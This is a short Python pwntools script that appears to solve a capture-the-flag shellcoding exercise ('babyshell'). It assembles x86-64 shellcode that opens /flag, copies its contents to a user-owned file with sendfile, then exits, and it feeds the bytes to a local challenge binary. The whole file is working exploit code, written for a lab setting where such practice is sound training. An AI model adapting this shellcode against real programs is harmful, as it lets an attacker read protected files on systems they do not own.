import pwn
from pwn import *
import os 
pwnlib.context.context.log_level="DEBUG"
pwnlib.context.context.os = 'linux'
pwnlib.context.context.arch = 'amd64'

chall_id = int(os.environ["CHALLENGE_ID"])-216

code_asm = """
    mov ax, 0x2    
    lea rdi, [rip + flag]
    mov esi, 0x0
    syscall         #open a /flag file
    mov r13, rax    #save fd in r13

    mov ax, 0x2
    lea rdi, [rip + output]
    mov esi, 0x1
    syscall         #open an output file
    mov r12, rax    #save fd in r12

    mov rsi, r13
    mov rdi, r12
    mov rdx, 0
    mov r10, 0xff
    mov rax, 0x28
    syscall         #sendfile from flag fd to output fd

    mov edi, 0x0
    mov eax, 0x3C
    syscall   #exit syscall

    output:
    .string "/home/hacker/output"
    
    flag:
    .string "/flag"
"""

code_bytes = asm(code_asm)

chall = pwn.process([f"/challenge/babyshell_level{chall_id}"])
chall.recvuntil(b'Reading 0x4000 bytes from stdin.\n')
chall.recvline() # newline
chall.send_raw(code_bytes)
chall.recvall()
